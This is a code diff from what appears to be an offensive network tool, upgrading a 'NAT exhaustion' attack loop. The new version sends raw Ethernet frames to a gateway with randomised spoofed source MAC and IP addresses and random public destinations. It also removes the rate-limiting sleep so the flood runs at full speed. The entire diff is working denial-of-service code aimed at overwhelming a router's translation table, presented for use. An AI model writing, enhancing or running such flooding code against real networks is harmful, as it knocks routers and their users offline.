@@ -9,8 +9,28 @@
 #include <chrono>
 #include <cstdlib>
 #include <ctime>
+#include <vector>
+#include <net/ethernet.h> 
+#include <net/if.h>
+#include <linux/if_packet.h>
+
 
 #include "../headers/nat.h"
+#include "../headers/helperfuncs.h"
+
+
+// Helper function to parse MAC address string
+std::vector<uint8_t> parse_mac_address(const std::string& mac_str) {
+    std::vector<uint8_t> mac_addr;
+    std::stringstream ss(mac_str);
+    std::string segment;
+
+    while(std::getline(ss, segment, ':')) {
+        mac_addr.push_back(std::stoul(segment, nullptr, 16));
+    }
+    return mac_addr;
+}
+
 
 // Standard Internet Checksum
 unsigned short checksum(void* b, int len) {
@@ -99,6 +119,16 @@ void NAT::run(Session* session) {
         return;
     }
 
+    // Get gateway MAC address
+    HelperFunctions hf;
+    std::string gateway_mac_str = hf.get_mac_from_ip(session->gateway_ip);
+    if (gateway_mac_str.empty() || gateway_mac_str == "00:00:00:00:00:00") {
+        std::cerr << "[-] Error: Could not determine gateway MAC address. Make sure the gateway is in the ARP cache." << std::endl;
+        return;
+    }
+    std::vector<uint8_t> gateway_mac = parse_mac_address(gateway_mac_str);
+
+
     int thread_count = 4; // Default thread count
     
     std::string local_ip = session->helper->get_local_ip(session->interface.c_str());
@@ -111,66 +141,100 @@ void NAT::run(Session* session) {
     //std::cout << C_GREEN << "[+] Launching " << thread_count << " threads for NAT exhaustion via " << session->gateway_ip << C_RESET << std::endl;
 
     for (int i = 0; i < thread_count; i++) {
-        attack_threads.emplace_back(&NAT::exhaust_loop, this, local_ip, i);
+        attack_threads.emplace_back(&NAT::exhaust_loop, this, local_ip, session->interface, gateway_mac, i);
     }
 }
 
-void NAT::exhaust_loop(std::string local_ip, int thread_id) {
-    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
+void NAT::exhaust_loop(std::string local_ip, std::string interface_name, std::vector<uint8_t> gateway_mac, int thread_id) {
+    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
     if (sock < 0) {
-        perror("Socket creation failed");
+        perror("Socket creation failed (AF_PACKET)");
         return;
     }
 
-    char packet[4096];
-    struct iphdr *iph = (struct iphdr *)packet;
-    struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct ip));
+    // --- Start of performance improvements ---
+
+    // Set up a high-quality random number generator for this thread.
+    std::random_device rd;
+    std::mt19937 gen(rd() + thread_id);
+    std::uniform_int_distribution<uint32_t> u32_dist;
+    std::uniform_int_distribution<uint16_t> u16_dist;
+    std::uniform_int_distribution<uint16_t> port_dist(1, 65535);
+    std::uniform_int_distribution<uint8_t> host_dist(2, 254);
+
+    // Pre-calculate the source subnet to avoid string operations in the loop.
+    uint32_t src_net;
+    struct in_addr addr;
+    if (inet_aton(local_ip.c_str(), &addr) == 0) {
+        src_net = (192 << 24) | (168 << 16) | (1 << 8); // Default to 192.168.1.0/24
+    } else {
+        src_net = ntohl(addr.s_addr) & 0xFFFFFF00; // Extract /24 network, host byte order
+    }
+
+    // --- End of performance improvements ---
+
+    // Prepare packet buffer and headers
+    const int packet_len = sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr);
+    char packet[packet_len];
+    struct ether_header *eth = (struct ether_header *)packet;
+    struct iphdr *iph = (struct iphdr *)(packet + sizeof(struct ether_header));
+    struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct ether_header) + sizeof(struct ip));
     
-    struct sockaddr_in sin;
-    sin.sin_family = AF_INET;
+    // Prepare socket address for sending
+    struct sockaddr_ll socket_address;
+    socket_address.sll_ifindex = if_nametoindex(interface_name.c_str());
+    socket_address.sll_halen = ETH_ALEN;
+    memcpy(socket_address.sll_addr, gateway_mac.data(), ETH_ALEN);
 
-    int one = 1;
-    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
-        perror("setsockopt(IP_HDRINCL) failed");
-        close(sock);
-        return;
-    }
 
     while (running) {
-        memset(packet, 0, 4096);
+        memset(packet, 0, packet_len);
 
-        std::string spoofed_src_ip = generate_random_local_ip(local_ip);
-        std::string random_dest_ip = generate_random_public_ip();
+        // --- L2 - Ethernet Header ---
+        uint32_t rand_mac1 = u32_dist(gen);
+        uint16_t rand_mac2 = u16_dist(gen);
+        memcpy(eth->ether_shost, &rand_mac1, 4);
+        memcpy(eth->ether_shost + 4, &rand_mac2, 2);
+        memcpy(eth->ether_dhost, gateway_mac.data(), ETH_ALEN);
+        eth->ether_type = htons(ETH_P_IP);
 
-        sin.sin_port = htons(rand() % 65535 + 1);
-        sin.sin_addr.s_addr = inet_addr(random_dest_ip.c_str());
 
-        // IP Header
+        // --- L3 - IP Header ---
+        uint32_t spoofed_src_ip_int = src_net | host_dist(gen);
+
+        uint32_t random_dest_ip_int;
+        uint8_t o1, o2;
+        do {
+            random_dest_ip_int = u32_dist(gen);
+            o1 = (random_dest_ip_int >> 24) & 0xFF;
+            o2 = (random_dest_ip_int >> 16) & 0xFF;
+        } while (o1 == 10 || o1 == 127 || (o1 == 172 && o2 >= 16 && o2 <= 31) || (o1 == 192 && o2 == 168) || o1 >= 224 || o1 == 0);
+
+
         iph->ihl = 5;
         iph->version = 4;
         iph->tos = 0;
-        iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr);
-        iph->id = htonl(rand() % 65535);
+        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr));
+        iph->id = htons(u16_dist(gen));
         iph->frag_off = 0;
         iph->ttl = 64;
         iph->protocol = IPPROTO_UDP;
         iph->check = 0; 
-        iph->saddr = inet_addr(spoofed_src_ip.c_str());
-        iph->daddr = sin.sin_addr.s_addr;
+        iph->saddr = htonl(spoofed_src_ip_int);
+        iph->daddr = htonl(random_dest_ip_int);
 
-        // UDP Header
-        udph->source = htons(rand() % 65535 + 1);
-        udph->dest = sin.sin_port;
+        // --- L4 - UDP Header ---
+        udph->source = port_dist(gen);
+        udph->dest = htons(port_dist(gen));
         udph->len = htons(sizeof(struct udphdr));
         udph->check = 0; 
 
-        iph->check = checksum((unsigned short *)packet, iph->tot_len);
+        // Calculate IP checksum
+        iph->check = checksum((unsigned short *)iph, sizeof(struct iphdr));
 
-        if (sendto(sock, packet, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
+        if (sendto(sock, packet, packet_len, 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
             //perror("sendto failed");
         }
-        
-        std::this_thread::sleep_for(std::chrono::microseconds(100));
     }
 
     close(sock);
